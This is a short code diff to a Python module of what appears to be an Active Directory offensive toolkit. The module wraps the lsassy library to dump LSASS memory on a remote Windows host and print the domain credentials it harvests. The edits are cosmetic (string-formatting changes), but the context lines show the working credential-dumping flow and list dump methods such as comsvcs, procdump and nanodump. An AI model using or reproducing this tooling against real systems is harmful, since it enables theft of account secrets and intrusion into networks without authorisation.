@@ -3,7 +3,6 @@
 Extracts credentials from LSASS memory remotely using multiple
 dump methods (comsvcs, procdump, nanodump, PPLdump).
 """
-from __future__ import annotations
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -29,7 +28,7 @@ def run(args: Any) -> int:
     method = getattr(args, "method", "comsvcs")
     output_dir = getattr(args, "output", ".")
 
-    print("[*] lsassy → {} (method: {})".format(target, method))
+    print(f"[*] lsassy → {target} (method: {method})")
 
     try:
         from lsassy import Dumper, Parser, Logger
@@ -51,7 +50,7 @@ def run(args: Any) -> int:
         parser = Parser(dumper.get_file())
         credentials = parser.parse()
 
-        print("[+] Extracted {} credentials:".format(len(credentials)))
+        print(f"[+] Extracted {len(credentials)} credentials:")
         for c in credentials:
             print("  {}\\{} : {} (type: {})".format(
                 c.get("domain", ""), c.get("username", ""),
@@ -59,5 +58,5 @@ def run(args: Any) -> int:
         return 0
 
     except Exception as exc:
-        print("[-] lsassy error: {}".format(exc), file=sys.stderr)
+        print(f"[-] lsassy error: {exc}", file=sys.stderr)
         return 1
